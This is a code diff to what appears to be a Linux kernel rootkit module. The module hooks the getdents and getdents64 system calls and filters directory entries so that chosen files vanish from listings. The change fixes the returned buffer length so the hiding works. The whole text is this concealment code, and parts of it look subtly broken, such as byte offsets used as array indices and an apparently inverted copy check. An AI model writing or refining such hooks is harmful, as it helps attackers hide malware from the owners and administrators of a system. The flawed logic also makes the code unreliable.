@@ -25,7 +25,7 @@ struct linux_dirent {
 	*/
 };
 
-void filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent));
+int filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent));
 int filter_fn(struct linux_dirent d);
 
 asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
@@ -38,8 +38,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
 	
 	if (length == -1 || length == 0) return length;
 	
-	filter_out(dirp, length, &filter_fn);
-	return length;
+	return filter_out(dirp, length, &filter_fn);
 }
 
 asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
@@ -49,11 +48,10 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsign
 	
 	if (length == -1 || length == 0) return length;
 	
-	filter_out(dirp, length, &filter_fn);
-	return length;
+	return filter_out(dirp, length, &filter_fn);
 }
 
-void filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent)) {
+int filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent)) {
 	int index = 0;
 	int index_copyto = -1;
 	unsigned short reclen;
@@ -62,6 +60,8 @@ void filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_
 	while (index < length) {
 		reclen = dirp[index].d_reclen;
 		if (!pred(*(dirp+index))) {
+			length -= reclen;
+			
 			if (index_copyto != -1) {
 				index_copyto = index;
 			}
@@ -72,6 +72,8 @@ void filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_
 		
 		index += reclen;
 	}
+	
+	return length;
 }
 
 int filter_fn(struct linux_dirent d) {
